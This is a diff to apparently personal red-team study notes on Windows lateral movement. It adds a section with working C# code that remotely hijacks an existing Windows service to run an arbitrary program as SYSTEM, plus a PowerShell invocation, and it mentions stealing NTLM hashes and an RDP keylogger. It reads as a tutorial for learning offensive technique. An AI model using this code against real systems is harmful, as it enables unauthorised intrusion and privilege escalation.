@@ -16,6 +16,7 @@ tags:
   - hash
   - socks
   - chisel
+  - psexec
 ---
 
 ## Remote desktop protocol
@@ -192,3 +193,124 @@ RDP - essentially a keylogger. [RdpThief](https://github.com/0x09AL/RdpThief) is
 a standalone DLL that we can inject to conduct this attack. Tools like
 [RDPThiefInject](https://github.com/S3cur3Th1sSh1t/RDPThiefInject) provide
 example code to generate payloads.
+
+## PsExec
+
+The **SysInternals** **PsExec** application enables lateral movement by using
+the current user's authentication context to pass the hash to a target computer,
+create a new service on the remote host, and start the service in the context of
+**SYSTEM**. This requires the PsExec application to drop a binary on the remote
+host as an executable file is required to correctly configure a new service.
+
+We can avoid creating a new service and dropping a file on the remote host by
+hijacking a currently existing service and modifying its configured executable.
+Using the follow C# .NET code, we can implement this tactic:
+
+```csharp
+﻿using System.Runtime.InteropServices;
+
+namespace QuietPsExec;
+
+class Program
+{
+    [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
+    [return:MarshalAs(UnmanagedType.Bool)]
+    public static extern bool ChangeServiceConfigA(
+        IntPtr hService,
+        uint dwServiceType,
+        int dwStartType,
+        int dwErrorControl,
+        string lpBinaryPathName,
+        string? lpLoadOrderGroup,
+        string? lpdwTagId,
+        string? lpDependencies,
+        string? lpServiceStartName,
+        string? lpPassword,
+        string? lpDisplayName
+    );
+
+    [DllImport(
+        "advapi32.dll",
+        EntryPoint = "OpenSCManagerW",
+        ExactSpelling = true,
+        CharSet = CharSet.Unicode,
+        SetLastError = true
+    )]
+    public static extern IntPtr OpenSCManager(
+        string machineName,
+        string? databaseName,
+        uint dwAccess
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    static extern IntPtr OpenService(
+        IntPtr hSCManager,
+        string lpServiceName,
+        uint dwDesiredAccess
+    );
+
+    [DllImport("advapi32", SetLastError = true)]
+    [return:MarshalAs(UnmanagedType.Bool)]
+    public static extern bool StartService(
+        IntPtr hService,
+        int dwNumServiceArgs,
+        string[]? lpServiceArgVectors
+    );
+
+    private const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
+    private const uint SERVICE_ALL_ACCESS = 0xF01FF;
+
+    static void Main(string[] args)
+    {
+        string targetComputer = args[0];
+        string serviceName = args[1];
+        string programName = args[2];
+
+        IntPtr hSCManager = OpenSCManager(
+            targetComputer,
+            null,
+            SC_MANAGER_ALL_ACCESS
+        );
+
+        IntPtr hService = OpenService(
+            hSCManager,
+            serviceName,
+            SERVICE_ALL_ACCESS
+        );
+
+        ChangeServiceConfigA(
+            hService,
+            0xffffffff,
+            3,
+            0,
+            programName,
+            null,
+            null,
+            null,
+            null,
+            null,
+            null
+        );
+
+        StartService(hService, 0, null);
+    }
+}
+```
+
+An example invocation of this compiled program will modify the **SensorService**
+service to execute the **notepad** application as the SYSTEM user:
+
+```powershell
+Start-Process `
+	-FilePath ".\QuietPsExec.exe" `
+	-ArgumentList @(
+		"${COMPUTERNAME}",
+		"SensorService",
+		"notepad.exe"
+	)
+```
+
+While the above code is intended to be executed from a compromised host within
+our target domain, we can also exfiltrate NTLM hashes for target users and
+execute the same technique from our attacker machine. This tactic is implemented
+in the [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) application.
